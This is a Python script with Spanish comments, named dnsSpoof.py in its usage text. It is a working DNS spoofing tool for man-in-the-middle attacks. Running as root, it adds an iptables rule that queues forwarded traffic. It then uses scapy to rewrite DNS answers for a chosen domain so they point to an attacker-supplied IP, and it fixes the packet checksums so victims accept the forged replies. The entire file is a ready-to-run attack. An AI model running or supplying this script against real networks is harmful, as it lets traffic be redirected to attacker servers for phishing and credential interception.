#!/bin/python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import argparse
from colorama import init, Fore
import os
from subprocess import call

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", help="Interfaz a configurar. Ejemplo: ./dnsSpoof.py -i eth0")
parser.add_argument("-d", "--domain", dest="domain", help="Dominio a falsear. Ejemplo: ./dnsSpoof.py -d google.com")
parser.add_argument("-r", "--response", dest="response", help="IP de respuesta. Será la IP del servidor de MiTM. Ejemplo: ./dnsSpoof.py -d stackoverflow.com -r 10.0.2.5")
options = parser.parse_args()

init()

GREEN = Fore.GREEN
RESET = Fore.RESET


# COMPROBAR USUARIO ROOT Y FORWARDING ACTIVADO
if os.geteuid() != 0:
    print ("¡EJECUTA COMO ROOT!".center(100, "="))
    exit()
else:
    print ( f"{GREEN}[+] Comprobando forwarding...{RESET}" )
    call(['sudo', 'iptables', '-A', 'FORWARD', '-i', str(options.interface), '-j', 'NFQUEUE', '--queue-num', '5'])

print ( f'{GREEN}[+] Spoofing {options.domain}...{RESET}' )

def processPackets(packet):  # Función de llamada
    scapyPacket = IP(packet.get_payload())  # Se convierten los datos a paquetes de Scapy

    if scapyPacket.haslayer(DNSRR) and scapyPacket.haslayer(UDP):

        wwwDomain = 'www.' + str(options.domain)
        endDomain = wwwDomain + '.'

        print ( f'{GREEN}[*] {scapyPacket[IP].dst} ha pedido el dominio {scapyPacket[DNSQR].qname}{RESET}' )

        if options.domain in str(scapyPacket[DNSQR].qname):
            dnsResponse = DNSRR(rrname=endDomain, rdata=options.response)  # Se genera respuesta DNS con los parámetros necesarios. El resto los genera Scapy
            scapyPacket[DNS].an = dnsResponse  # La respuesta a la consulta original se convierte en la creada
            scapyPacket[DNS].ancount = 1

            # MODIFICACIÓN DE PARÁMETROS PARA EVITAR CORRUPCIÓN DE PAQUETES

            del scapyPacket[IP].len
            del scapyPacket[IP].chksum
            
            del scapyPacket[UDP].len
            del scapyPacket[UDP].chksum
            
            
            # SE ENVÍA LA CARGA CREADA COMO RESPUESTA A LA PETICIÓN ORIGINAL
            packet.set_payload(bytes(scapyPacket))  # Se convierten los paquetes de Scapy a bytes para que sean correctamente interpretados por el objetivo

        else:
            pass
    packet.accept()  # Se reenvían los paquetes encolados

queue = NetfilterQueue()
queue.bind(5, processPackets)  # Se une la cola que creamos con la de la regla en IPTables mediante el número. Como segundo parámetro se establece una función de llamada

queue.run()
